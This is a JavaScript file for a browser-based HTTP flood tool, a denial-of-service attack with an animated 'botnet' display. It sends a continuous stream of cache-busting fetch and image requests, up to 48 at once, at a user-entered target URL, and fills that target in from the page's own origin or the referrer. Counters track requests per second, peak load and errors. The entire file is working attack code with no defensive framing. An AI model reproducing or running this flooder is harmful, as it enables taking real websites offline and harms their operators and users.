svg.script:
//
(function(){
var NS='http://www.w3.org/2000/svg';
function $(i){return document.getElementById(i);}
function mk(t,a){var e=document.createElementNS(NS,t);for(var k in a)e.setAttribute(k,a[k]);return e;}
var links=$('links'),nodes=$('nodes'),pkts=$('pkts'),rips=$('rips'),coreR=$('coreR');
var CX=350,CY=336;
var bots=[],packets=[],ripples=[],pi=0,ri=0,ripAcc=0;
var running=false,total=0,errors=0,inflight=0,peak=0,rps=0,t0=0,shown=0,shownT=0,durTimer=null;
var MAXIN=48,BOTN=40;

function fmt(n){return n.toLocaleString('en-US');}

function detect(){
  var t='';
  try{if(/^https?:/.test(location.protocol)&&location.hostname)t=location.origin;}catch(e){}
  if(!t){try{if(document.referrer)t=new URL(document.referrer).origin;}catch(e){}}
  return t;
}
function getTarget(){
  var v=$('target').value.trim();
  if(!v)return '';
  if(!/^https?:\/\//i.test(v))v='https://'+v;
  return v;
}
function bust(u){
  var h='',i=u.indexOf('#');
  if(i>-1){h=u.slice(i);u=u.slice(0,i);}
  return u+(u.indexOf('?')>-1?'&':'?')+'ddos='+Math.random().toString(36).slice(2,10)+Date.now().toString(36)+h;
}

function build(n){
  while(links.firstChild)links.removeChild(links.firstChild);
  while(nodes.firstChild)nodes.removeChild(nodes.firstChild);
  bots=[];
  var o=Math.max(6,Math.round(n*0.62)),inn=Math.max(0,n-o);
  ring(o,134,5,0);
  ring(inn,80,3.6,Math.PI/Math.max(1,o));
}
function ring(c,R,r,off){
  for(var i=0;i<c;i++){
    var a=off+(i/c)*Math.PI*2,x=CX+Math.cos(a)*R,y=CY+Math.sin(a)*R;
    var l=mk('line',{x1:CX,y1:CY,x2:x,y2:y,'class':'link'});
    links.appendChild(l);
    var d=mk('circle',{cx:x,cy:y,r:r,'class':'bot'});
    nodes.appendChild(d);
    bots.push({x:x,y:y,r0:r,el:d,ln:l,heat:0});
  }
}

for(var i=0;i<180;i++){var c=mk('circle',{r:2,'class':'pkt'});c.style.opacity=0;pkts.appendChild(c);packets.push({el:c,life:0,x0:CX,y0:CY});}
for(var j=0;j<10;j++){var q=mk('circle',{cx:CX,cy:CY,r:30,'class':'rip'});q.style.opacity=0;rips.appendChild(q);ripples.push({el:q,life:0});}

function hit(k){
  if(!bots.length)return;
  var b=bots[k%bots.length];
  b.heat=Math.min(1,b.heat+0.55);
  var p=packets[pi++%packets.length];
  p.x0=b.x;p.y0=b.y;p.life=1;
  p.el.setAttribute('cx',b.x);p.el.setAttribute('cy',b.y);
}

var last=0;
function frame(ts){
  var dt=Math.min(60,ts-last||16);last=ts;
  for(var i=0;i<bots.length;i++){var b=bots[i];
    if(b.heat>0.003){
      b.heat*=Math.pow(0.87,dt/16);
      b.el.style.opacity=(0.18+b.heat*0.82).toFixed(3);
      b.el.setAttribute('r',(b.r0*(1+b.heat*0.8)).toFixed(2));
      b.ln.style.opacity=(0.05+b.heat*0.5).toFixed(3);
    }
  }
  for(var k=0;k<packets.length;k++){var p=packets[k];
    if(p.life>0){
      p.life-=dt/330;
      if(p.life<=0){p.life=0;p.el.style.opacity=0;}
      else{var t=1-p.life;
        p.el.setAttribute('cx',(p.x0+(CX-p.x0)*t).toFixed(1));
        p.el.setAttribute('cy',(p.y0+(CY-p.y0)*t).toFixed(1));
        p.el.style.opacity=(0.85*p.life).toFixed(3);}
    }
  }
  ripAcc+=dt;
  if(running&&ripAcc>75){ripAcc=0;var rr=ripples[ri++%ripples.length];rr.life=1;}
  for(var m=0;m<ripples.length;m++){var rp=ripples[m];
    if(rp.life>0){rp.life-=dt/760;
      if(rp.life<=0){rp.life=0;rp.el.style.opacity=0;}
      else{rp.el.setAttribute('r',(30+(1-rp.life)*108).toFixed(1));rp.el.style.opacity=(rp.life*0.45).toFixed(3);}}
  }
  var hot=Math.min(1,rps/900);
  coreR.setAttribute('r',(20+hot*9).toFixed(1));
  requestAnimationFrame(frame);
}
requestAnimationFrame(frame);

function pump(){
  if(!running)return;
  if(inflight>=MAXIN)return;
  var base=getTarget();if(!base)return;
  inflight++;total++;
  var url=bust(base);
  hit((Math.random()*100000)|0);
  var done=function(){if(inflight>0)inflight--;};
  if(Math.random()<0.5){
    try{fetch(url,{mode:'no-cors',cache:'no-store',credentials:'omit'}).then(done,function(){errors++;done();});}
    catch(e){errors++;done();}
  }else{
    var im=new Image();im.onload=done;im.onerror=function(){errors++;done();};im.src=url;
  }
}
setInterval(function(){for(var i=0;i<40;i++)pump();},0);

setInterval(function(){
  var now=performance.now();
  if(running){
    var dt=(now-shownT)/1000;
    if(dt>=0.25){
      var inst=(total-shown)/dt;
      rps=Math.round(rps*0.35+inst*0.65);
      if(rps>peak)peak=rps;
      shown=total;shownT=now;
    }
  }else{rps=Math.round(rps*0.7);if(rps<1)rps=0;}
  $('s_req').textContent=fmt(total);
  $('s_rps').textContent=fmt(rps);
  $('s_peak').textContent=fmt(peak);
  $('s_inf').textContent=inflight;
  $('s_err').textContent=fmt(errors);
  $('s_up').textContent=(t0?((now-t0)/1000).toFixed(1):'0.0')+'s';
},200);

function start(){
  if(running)return;
  if(!getTarget()){$('target').focus();$('log').textContent='enter a target URL first';return;}
  running=true;t0=performance.now();shownT=t0;shown=total;
  $('stxt').textContent='FIRING';$('stxt').setAttribute('fill','#34d399');$('dot').setAttribute('fill','#34d399');
  $('go').classList.add('live');
  $('log').textContent='flooding '+getTarget()+' with '+MAXIN+' concurrent sockets';
  var d=parseInt($('dur').value||'0',10)||0;
  if(durTimer)clearTimeout(durTimer);
  if(d>0)durTimer=setTimeout(stop,d*1000);
}
function stop(){
  running=false;
  $('stxt').textContent='IDLE';$('stxt').setAttribute('fill','#94a3b8');$('dot').setAttribute('fill','#5b7a94');
  $('go').classList.remove('live');
  if(durTimer)clearTimeout(durTimer);
  $('log').textContent='stopped · '+fmt(total)+' requests dispatched · '+fmt(errors)+' failed';
}
function reset(){
  stop();total=0;errors=0;peak=0;rps=0;shown=0;t0=0;
  $('log').textContent='reset';
}

$('go').addEventListener('click',start);
$('stop').addEventListener('click',stop);
$('rst').addEventListener('click',reset);
$('conc').addEventListener('input',function(){MAXIN=+this.value;$('concv').textContent=this.value;});
$('bots').addEventListener('input',function(){BOTN=+this.value;$('botsv').textContent=this.value;build(BOTN);});
$('target').addEventListener('keydown',function(e){if(e.key==='Enter'){if(running)stop();else start();}});

var d=detect();
if(d)$('target').value=d;
build(BOTN);
$('log').textContent=d?('detected host: '+d+' · press START'):'no host detected · type a URL and press START';
})();
//
